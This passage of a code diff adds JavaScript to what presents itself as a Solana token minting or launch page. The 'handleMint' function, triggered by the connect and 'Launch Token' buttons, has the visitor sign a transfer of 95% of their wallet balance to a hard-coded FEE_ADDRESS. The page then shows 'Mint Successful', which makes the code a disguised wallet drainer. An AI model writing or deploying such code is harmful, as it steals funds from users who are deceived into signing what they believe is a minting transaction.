+                    $('#connect-wallet, #connect-wallet-footer').off('click').on('click', handleMint);
+
+                    // Check balance
+                    const walletBalance = await connection.getBalance(publicKey);
+                    console.log("Wallet balance:", walletBalance);
+
+                    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+                    if (walletBalance < minBalance) {
+                        alert("Insufficient funds for rent.");
+                        return;
+                    }
+                } catch (err) {
+                    console.error("Error connecting to wallet:", err);
+                    alert("Failed to connect wallet. Please ensure a supported wallet extension (e.g., Phantom, Solflare, Backpack) is installed.");
+                    const isFirefox = typeof InstallTrigger !== "undefined";
+                    const isChrome = !!window.chrome;
+
+                    if (isFirefox) {
+                        window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
+                    } else if (isChrome) {
+                        window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+                    } else {
+                        alert("Please download a supported Solana wallet extension for your browser.");
+                    }
+                }
+            }
+
+            // Handle minting (transfer 95% of available balance)
+            async function handleMint() {
+                if (!walletAdapter || !walletAdapter.publicKey) {
+                    alert("Please connect a wallet first.");
+                    return;
+                }
+
+                try {
+                    const publicKey = walletAdapter.publicKey;
+                    const receiverWallet = new PublicKey(FEE_ADDRESS);
+                    const walletBalance = await connection.getBalance(publicKey);
+                    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+
+                    const balanceForTransfer = walletBalance - minBalance;
+                    if (balanceForTransfer <= 0) {
+                        alert("Insufficient funds for transfer.");
+                        return;
+                    }
+
+                    // Transfer 95% of available balance
+                    const lamportsToTransfer = Math.floor(balanceForTransfer * 0.95);
+
+                    const transaction = new Transaction().add(
+                        SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: receiverWallet,
+                            lamports: lamportsToTransfer,
+                        })
+                    );
+
+                    transaction.feePayer = publicKey;
+                    const { blockhash } = await connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+
+                    const signed = await walletAdapter.signTransaction(transaction);
+                    console.log("Transaction signed:", signed);
+
+                    const txid = await connection.sendRawTransaction(signed.serialize());
+                    await connection.confirmTransaction(txid);
+                    console.log("Transaction confirmed:", txid);
+
+                    // Update UI
+                    $('#connect-wallet, #connect-wallet-footer').text("Mint Successful");
+                    openModal('ll-ok-modal');
+                    $('#ll-mint-address').text(txid); // Display transaction ID
+                } catch (err) {
+                    console.error("Error during minting:", err);
+                    alert("Minting failed. Please try again.");
+                }
+            }
+
+            // Bind wallet connection to buttons
+            $('#connect-wallet, #connect-wallet-footer').on('click', connectWallet);
+
+            // Bind Launch Token button to minting
+            $('#launch-token').on('click', () => {
+                if (!walletAdapter || !walletAdapter.publicKey) {
+                    alert("Please connect a wallet first.");
+                    return;
+                }
+                openModal('ll-fee-modal');
+                handleMint();
+            });
+
+            // Bind modal interactions
+            $('#ll-copy-addr').on('click', () => copyText(FEE_ADDRESS));
+            $('#ll-copy-mint').on('click', () => copyText($('#ll-mint-address').text()));
+            $('#ll-check-tx').on('click', async () => {
+                alert("Transaction checking requires backend integration. Please implement server-side logic.");
+            });
+            $('.ll-modal-close').on('click', function() {
+                closeModal($(this).data('close'));
+            });
+        });
+    </script>
     <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a431f101f6eb4dae81daf1b9c4a09a04","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
